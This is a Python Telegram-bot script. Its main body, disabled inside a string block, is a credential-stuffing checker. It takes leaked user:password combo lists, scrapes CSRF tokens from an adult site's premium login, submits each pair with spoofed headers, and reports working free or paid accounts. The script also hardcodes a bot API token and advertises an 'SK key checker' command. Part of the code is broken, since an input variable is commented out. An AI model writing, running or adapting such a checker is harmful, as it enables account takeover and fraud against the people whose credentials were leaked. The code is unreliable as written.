from telebot import *
from time import sleep
import os
import json
from bs4 import BeautifulSoup
import requests
from requests.structures import CaseInsensitiveDict
bot_api = "5664500690:AAEL3QRmTfkuFiUXzjjHZA-jEt02iQ9ly2o"
bot = telebot.TeleBot(bot_api)
os.system("clear")
#file_name = input("\033[0;34m|\033[0;31mEnter your Combo list  \n\033[0;34m|-> \033[0;32m")
file =open(file_name,'r')
def pr(list):
 i=1
 for e in list:
  if "-" in e:
   list2 = list.split(">")
   ok = (list2[1])
   g=1
   for f in ok:
    print('\033[31m'+list[:i].upper()+'>\033[32m'+ok[:g],end='\r',)
    sleep(0.14)
    g+=1
   break
  else:
   print('\033[31m'+list[:i].upper(),end='\r',)
  i+=1
  sleep(0.14)
 print("")
"""
i=0
while True:
 combo=file.readline().strip()
 if not combo:
  print("ALL AC CHECKED")
 comb = combo.split(":")
 user = comb[0]
 pas = comb[1]
 r = requests.post("https://www.xnxx.gold/account/signinform/create/premium_tour")
 j = json.loads(r.text)
 r_cookie = (r.cookies)
 word = str(r_cookie)
 words = word.split(" ")
 cit = (words[1])
 si = (words[5])
 headers = CaseInsensitiveDict()
 headers["Host"]="www.xnxx.gold"
 headers["Accept"]="application/json,text/javascript,*/*;q=0.01"
 headers["Content-Type"]="application/x-www-form-urlencoded;charset=UTF-8"
 headers["User-Agent"]="Mozilla/5.0(Linux;Android11;M2101K7BI)AppleWebKit/537.36(KHTML,likeGecko)Chrome/106.0.0.0MobileSafari/537.36"
 headers["Accept-Encoding"]="gzip,deflate,br"
 headers["Accept-Language"]="en-IN,en;q=0.9"
 headers["Cookie"]= cit+';'+si
 form = j["form"]
 soup = BeautifulSoup(form,"html.parser")
 signin_form_form = soup.find(id="signin-form_form").get("value")
 signin_form_csrf_token = soup.find(id="signin-form_csrf_token").get("value")
 signin_form_pms = soup.find(id = "signin-form_pms").get("value")
 payload = (f"signin-form[form]={signin_form_form}&signin-form[votes]=&signin-form[subs]=&signin-form[post_referer]=&signin-form[csrf_token]={signin_form_csrf_token}&signin-form[pms]={signin_form_pms}&signin-form[login]={user}&signin-form[password]={pas}")
 re = requests.post("https://www.xnxx.gold/account/signinform/create/premium_tour",data=payload,headers=headers)
 if "is_premium" in re.text:
  pr(f"Working ac -> {user}:{pas}")
  je = json.loads(re.text)["is_premium"]
  if je == False:
   pr("AC type -> Free")
  else:
   pr(f"AC type -> Paid {je}")
 else:
  print(f"\033[0;34mBad Ac -> \033[0;31m{user}:{pas}")
"""
@bot.message_handler(commands=['cmds'])
def cmds(message):
  bot.reply_to(message,parse_mode='HTML',text = ('<b>ꜱᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ -> </b><code>/sk ˢᵏ_ˣˣˣˣˣˣˣˣˣ</code>\n'))
bot.infinity_polling()
